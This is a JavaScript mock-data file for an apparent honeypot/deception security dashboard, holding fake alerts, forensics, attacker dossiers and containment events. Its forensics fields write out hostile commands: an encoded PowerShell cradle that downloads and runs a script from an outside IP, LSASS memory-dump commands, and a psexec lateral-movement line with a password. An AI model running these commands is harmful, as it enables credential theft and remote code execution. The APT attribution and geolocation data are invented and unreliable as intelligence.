// src/data/mockData.js
export const initialData = {
  // 24-Hour Threat Telemetry (00:00 to 23:00)
  telemetry24h: [
    { hour: "00:00", count: 2, trigger: "Automated Decoy Probe / Port 445" },
    { hour: "01:00", count: 1, trigger: "Decoy SMB Share Query" },
    { hour: "02:00", count: 0, trigger: "Nominal Baseline" },
    { hour: "03:00", count: 1, trigger: "Fake SSH Key Access" },
    { hour: "04:00", count: 3, trigger: "Brute Force Lured to Honeypot" },
    { hour: "05:00", count: 1, trigger: "Canary File Read Attempt" },
    { hour: "06:00", count: 2, trigger: "Decoy Service Enumeration" },
    { hour: "07:00", count: 4, trigger: "Shadow Admin Credential Injected" },
    { hour: "08:00", count: 6, trigger: "Decoy Kerberos Ticket Requested" },
    { hour: "09:00", count: 8, trigger: "Lateral Movement Traversal" },
    { hour: "10:00", count: 5, trigger: "Fake AWS Config Sniffed" },
    { hour: "11:00", count: 9, trigger: "Decoy MySQL Dump Queried" },
    { hour: "12:00", count: 7, trigger: "Fake Service Principal Query" },
    { hour: "13:00", count: 11, trigger: "Decoy LSASS Memory Scraped" },
    { hour: "14:00", count: 14, trigger: "Bait Token Cloned to External Git" },
    { hour: "15:00", count: 12, trigger: "Decoy Domain Controller Replay" },
    { hour: "16:00", count: 15, trigger: "Automated Honeynet Sweep" },
    { hour: "17:00", count: 10, trigger: "Decoy Kubeconfig Secret Read" },
    { hour: "18:00", count: 8, trigger: "Poisoned DLL Loaded into Memory" },
    { hour: "19:00", count: 13, trigger: "Decoy Reverse Shell Connected" },
    { hour: "20:00", count: 18, trigger: "Multi-vector Honeytoken Storm" },
    { hour: "21:00", count: 22, trigger: "Active Reverse Shell Spawn (ALT-9042)" },
    { hour: "22:00", count: 16, trigger: "Honeytoken Traversal (ALT-9039)" },
    { hour: "23:00", count: 12, trigger: "Post-Containment Decoy Ping" }
  ],

  // Active Alert Feed & Forensics
  alerts: [
    {
      id: "ALT-9042",
      severity: "critical",
      severityLabel: "Critical",
      attackType: "Reverse Shell Spawn",
      timestamp: "2026-09-12 21:04:12.894210Z",
      hostname: "dc-primary.corp.internal",
      sourceIp: "185.220.101.5",
      isPublic: true,
      caseKey: "CASE_A",
      targetEndpointId: "EP-001",
      baitTrigger: "Decoy AWS Production Secret Accessed & Exfiltrated",
      hostIsolated: false,
      ipBlocked: true,
      forensics: {
        parentPid: "PID 4192",
        parentProcess: "w3wp.exe (IIS Worker)",
        executedBinary: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHIAZQBlAGQALgBwAHMAMQAnACkA",
        fullPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        processTree: [
          { name: "services.exe [PID 640]", level: 0 },
          { name: "svchost.exe [PID 1120]", level: 1 },
          { name: "w3wp.exe [PID 4192] (Bait Web Server Trap)", level: 2 },
          { name: "cmd.exe /c powershell.exe -enc ... [PID 8820]", level: 3, critical: true }
        ],
        affectedTokens: ["aws_secret_key_decoy_prod", "kubeconfig_canary_cluster_admin", "honey_lsass_minidump"]
      }
    },
    {
      id: "ALT-9039",
      severity: "high",
      severityLabel: "High",
      attackType: "Honeytoken Traversal",
      timestamp: "2026-09-12 21:01:45.312044Z",
      hostname: "app-srv-01",
      sourceIp: "192.168.1.27",
      isPublic: false,
      caseKey: "CASE_B",
      targetEndpointId: "EP-002",
      baitTrigger: "Fake Shadow Admin Credential Injected & Queried",
      hostIsolated: true,
      ipBlocked: true,
      forensics: {
        parentPid: "PID 7810",
        parentProcess: "explorer.exe",
        executedBinary: "psexec.exe \\\\app-srv-01 -u CORP\\honey_shadowadmin -p DecoyP@ss99 cmd.exe",
        fullPath: "C:\\Tools\\Sysinternals\\PsExec.exe",
        sha256: "8f481e138a0a9ef86a41f9d5067272895697207604ebcf4c45a4993437e42d76",
        processTree: [
          { name: "winlogon.exe [PID 512]", level: 0 },
          { name: "explorer.exe [PID 7810]", level: 1 },
          { name: "psexec.exe [PID 9044] (Lateral Movement Decoy Hop)", level: 2, critical: true }
        ],
        affectedTokens: ["CORP\\honey_shadowadmin", "vpn_ovpn_profile_fake_dev"]
      }
    },
    {
      id: "ALT-9038",
      severity: "critical",
      severityLabel: "Critical",
      attackType: "LSASS Memory Dump",
      timestamp: "2026-09-12 20:58:39.119850Z",
      hostname: "finance-db.corp.internal",
      sourceIp: "91.240.118.172",
      isPublic: true,
      caseKey: "CASE_A",
      targetEndpointId: "EP-003",
      baitTrigger: "Decoy LSASS Canary Memory Region Read Attempt",
      hostIsolated: true,
      ipBlocked: true,
      forensics: {
        parentPid: "PID 1024",
        parentProcess: "rundll32.exe",
        executedBinary: "procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
        fullPath: "C:\\Windows\\Temp\\procdump64.exe",
        sha256: "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
        processTree: [
          { name: "services.exe [PID 640]", level: 0 },
          { name: "rundll32.exe comsvcs.dll, #24 [PID 1024]", level: 1 },
          { name: "procdump64.exe [PID 6644] (LSASS Deception Guard Triggered)", level: 2, critical: true }
        ],
        affectedTokens: ["fake_krbtgt_hash_corp", "decoy_finance_sa_creds"]
      }
    }
  ],

  // Attacker Intelligence Dossiers (Case A vs Case B)
  dossiers: {
    CASE_A: {
      key: "CASE_A",
      type: "External Adversary / Public IP",
      sourceIp: "185.220.101.5",
      isPublic: true,
      asn: "AS9009 (M247 Ltd)",
      isp: "M247 Europe Ltd",
      geolocation: "Bucharest, Romania (Pipera Tech Corridor)",
      coordinates: "44.4811° N, 26.1128° E",
      threatGroup: "APT-28 / FancyBear affiliate",
      mitreTechnique: "T1059.001 (Command & Scripting Interpreter: PowerShell)",
      targetedAsset: "dc-primary.corp.internal (10.0.1.10)",
      baitTriggered: "Decoy AWS Production Secret Accessed & Exfiltrated",
      confidenceScore: "99.4%",
      mapCity: "Bucharest, Romania"
    },
    CASE_B: {
      key: "CASE_B",
      type: "Internal Lateral Movement / RFC 1918 Private Subnet",
      sourceIp: "192.168.1.27",
      isPublic: false,
      hostname: "DESKTOP-AB123",
      macAddress: "00:1A:2B:3C:4D:5E",
      vlanId: "VLAN 40 — Engineering Hardware Lab",
      switchPort: "SW-CORE-02 / Interface Fa0/14",
      physicalLocation: "Bengaluru Campus, Building 4, Floor 2, Zone B",
      coordinates: "12.9260° N, 77.6762° E",
      threatGroup: "Insider Threat / Stolen Hardware Implant",
      mitreTechnique: "T1021.002 (Remote Services: SMB/Windows Admin Shares)",
      targetedAsset: "app-srv-01 (192.168.1.5)",
      baitTriggered: "Fake Shadow Admin Credential Injected & Queried",
      confidenceScore: "100% Deterministic (Internal Port Lock)",
      mapCity: "Bengaluru, India"
    }
  },

  // Recently Blocked IPs Ledger
  blockedLedger: [
    { timestamp: "2026-09-12 21:04:13.306Z", ip: "185.220.101.5", cidr: "185.220.101.5/32", triggerRule: "Auto-Drop: Honeytoken Decoy Exfiltration (ALT-9042)", status: "PERIMETER DROP ENFORCED" },
    { timestamp: "2026-09-12 21:01:45.724Z", ip: "192.168.1.27", cidr: "192.168.1.27/32", triggerRule: "VLAN Port Sever: Switch Port Fa0/14 Shutdown (ALT-9039)", status: "PORT ISOLATED" },
    { timestamp: "2026-09-12 20:58:39.531Z", ip: "91.240.118.172", cidr: "91.240.118.172/32", triggerRule: "Auto-Drop: LSASS Memory Deception Trigger (ALT-9038)", status: "PERIMETER DROP ENFORCED" },
    { timestamp: "2026-09-12 19:44:11.002Z", ip: "45.154.255.89", cidr: "45.154.255.89/32", triggerRule: "Auto-Drop: Decoy SSH Key Ingestion Attempt", status: "PERIMETER DROP ENFORCED" }
  ],

  // Microsecond Chronology Events
  timelineEvents: [
    {
      id: "EVT-1001",
      isoTimestamp: "2026-09-12 21:04:12.894210Z",
      action: "Bait Reverse Shell Socket Spawned",
      category: "EXECUTION",
      severity: "critical",
      process: "powershell.exe -enc ...",
      parentPid: "PID 4192 (w3wp.exe)",
      mitre: "T1059.001",
      details: "Inbound socket initiated from 185.220.101.5 to internal honeytoken listener on port 4444. Honeynet auto-engaged."
    },
    {
      id: "EVT-1002",
      isoTimestamp: "2026-09-12 21:04:13.112450Z",
      action: "Autonomous Deception Tripwire Tripped",
      category: "DETECTION",
      severity: "critical",
      process: "honeytrap-sensor-agent.exe",
      parentPid: "PID 892 (SYSTEM)",
      mitre: "T1071.001",
      details: "HoneyTrap Kernel Filter detected unauthorized read of Canary Vault key (aws_secret_key_decoy_prod)."
    },
    {
      id: "EVT-1003",
      isoTimestamp: "2026-09-12 21:04:13.208190Z",
      action: "Autonomous Containment Pipeline Engaged",
      category: "CONTAINMENT",
      severity: "critical",
      process: "honeytrap-containment-engine",
      parentPid: "PID 440 (SYSTEM)",
      mitre: "T1082",
      details: "State transitioned from DETECTED to CONTAINED. Microsecond TCP RST packets injected into socket 185.220.101.5:4444."
    },
    {
      id: "EVT-1004",
      isoTimestamp: "2026-09-12 21:04:13.298011Z",
      action: "Adversary Process Evicted from Memory",
      category: "EVICTION",
      severity: "high",
      process: "ntoskrnl.exe / ZwTerminateProcess",
      parentPid: "PID 4",
      mitre: "T1059",
      details: "Process tree under PID 8820 forcefully terminated via kernel driver. Memory dump preserved for forensics."
    },
    {
      id: "EVT-1005",
      isoTimestamp: "2026-09-12 21:04:13.306622Z",
      action: "Perimeter Firewall Rule Deployed & Host Quarantined",
      category: "ISOLATION",
      severity: "critical",
      process: "pfsense-api-connector",
      parentPid: "PID 910",
      mitre: "T1562.001",
      details: "Boundary firewall rule DROP pushed for 185.220.101.5/32. Target endpoint dc-primary placed in Deception Sandbox."
    }
  ],

  // 4-Stage Containment Pipeline
  containmentPipeline: {
    totalDuration: "412ms",
    stages: [
      { name: "1. DETECTED", time: "21:04:12.894210Z", note: "Bait Tripped" },
      { name: "2. CONTAINED", time: "21:04:13.112450Z", note: "TCP Reset" },
      { name: "3. EVICTED", time: "21:04:13.298011Z", note: "PID Killed" },
      { name: "4. ISOLATED", time: "21:04:13.306622Z", note: "Firewall Drop" }
    ]
  },

  // Fleet Endpoints
  endpoints: [
    {
      id: "EP-001",
      hostname: "dc-primary.corp.internal",
      os: "Windows Server 2022 (x86_64)",
      ip: "10.0.1.10",
      mac: "00:50:56:A1:22:B4",
      agentVersion: "v3.4.1-prod",
      honeytokens: ["3x AWS Decoys", "2x Canary Admins", "1x Fake SAM"],
      honeytokenCount: 6,
      status: "COMPROMISED",
      isolated: false
    },
    {
      id: "EP-002",
      hostname: "app-srv-01",
      os: "Ubuntu 22.04 LTS (x86_64)",
      ip: "192.168.1.5",
      mac: "00:50:56:B2:89:11",
      agentVersion: "v3.4.1-prod",
      honeytokens: ["4x Decoy DB Creds", "2x Kubeconfig", "3x Fake API Keys"],
      honeytokenCount: 9,
      status: "CONTAINED",
      isolated: true
    },
    {
      id: "EP-003",
      hostname: "finance-db.corp.internal",
      os: "RHEL 9.2 (x86_64)",
      ip: "10.0.3.50",
      mac: "00:50:56:CC:77:43",
      agentVersion: "v3.4.0-prod",
      honeytokens: ["6x Canary Tables", "1x Decoy SA Hash"],
      honeytokenCount: 7,
      status: "ISOLATED",
      isolated: true
    },
    {
      id: "EP-004",
      hostname: "eng-build-runner-04",
      os: "Ubuntu 24.04 LTS (arm64)",
      ip: "192.168.10.45",
      mac: "52:54:00:12:34:56",
      agentVersion: "v3.4.1-prod",
      honeytokens: ["5x Docker Canary Secrets", "2x Git Deploy Keys"],
      honeytokenCount: 7,
      status: "HEALTHY",
      isolated: false
    },
    {
      id: "EP-005",
      hostname: "vpn-gw-external.corp.internal",
      os: "FreeBSD 14.0-RELEASE (x86_64)",
      ip: "10.0.0.1",
      mac: "00:0C:29:44:9F:88",
      agentVersion: "v3.4.1-prod",
      honeytokens: ["3x Decoy VPN Users", "2x Fake Radius Secrets"],
      honeytokenCount: 5,
      status: "HEALTHY",
      isolated: false
    },
    {
      id: "EP-006",
      hostname: "sec-honeynet-collector-01",
      os: "Debian 12 Bookworm (x86_64)",
      ip: "10.99.0.2",
      mac: "00:15:5D:EE:33:09",
      agentVersion: "v3.4.1-prod",
      honeytokens: ["4x Decoy SSH Keys", "1x Fake LDAP Tree"],
      honeytokenCount: 5,
      status: "HEALTHY",
      isolated: false
    }
  ]
};
